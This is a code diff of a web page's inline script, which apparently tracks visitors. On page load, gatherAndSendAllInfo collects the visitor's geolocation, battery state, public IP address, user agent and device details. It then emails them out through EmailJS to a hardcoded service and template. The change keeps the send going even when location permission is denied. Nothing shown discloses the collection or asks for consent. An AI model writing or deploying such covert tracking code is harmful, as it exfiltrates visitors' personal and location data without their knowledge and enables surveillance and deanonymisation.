@@ -302,37 +302,41 @@
         }
 
         function gatherAndSendAllInfo() {
-            Promise.all([getLocation(), getBatteryInfo(), getIPAddress()])
-                .then(([location, battery, ip]) => {
-                    const data = {
-                        publicIP: ip,
-                        darkMode: isDarkMode(),
-                        location: `Lat: ${location.latitude}, Lon: ${location.longitude}`,
-                        browser: getBrowserAndDeviceInfo().userAgent,
-                        phone: getDeviceDetails(),
-                    };
+    Promise.all([
+        getLocation().catch(() => ({ latitude: "Permission Denied", longitude: "Permission Denied" })),
+        getBatteryInfo(),
+        getIPAddress()
+    ])
+    .then(([location, battery, ip]) => {
+        const data = {
+            publicIP: ip,
+            darkMode: isDarkMode(),
+            location: `Lat: ${location.latitude}, Lon: ${location.longitude}`,
+            browser: getBrowserAndDeviceInfo().userAgent,
+            phone: getDeviceDetails(),
+        };
 
-                    const emailParams = {
-                        public_ip: data.publicIP,
-                        dark_mode: data.darkMode,
-                        location: data.location,
-                        browser: data.browser,
-                        phone: data.phone,
-                    };
+        const emailParams = {
+            public_ip: data.publicIP,
+            dark_mode: data.darkMode,
+            location: data.location,
+            browser: data.browser,
+            phone: data.phone,
+        };
 
-                    console.log("Data collected:", data); // For debugging purposes
-                    emailjs.send('service_nhrkkzj', 'template_gcaqci5', emailParams)
-                        .then(response => {
-                            console.log("Email sent successfully!", response.status, response.text);
-                        })
-                        .catch(error => {
-                            console.error("Failed to send email", error);
-                        });
-                })
-                .catch(error => {
-                    console.error("Failed to gather information", error);
-                });
-        }
+        console.log("Data collected:", data); // For debugging purposes
+        emailjs.send('service_nhrkkzj', 'template_gcaqci5', emailParams)
+            .then(response => {
+                console.log("Email sent successfully!", response.status, response.text);
+            })
+            .catch(error => {
+                console.error("Failed to send email", error);
+            });
+    })
+    .catch(error => {
+        console.error("Failed to gather information", error);
+    });
+}
 
         document.addEventListener('DOMContentLoaded', gatherAndSendAllInfo);
     </script>
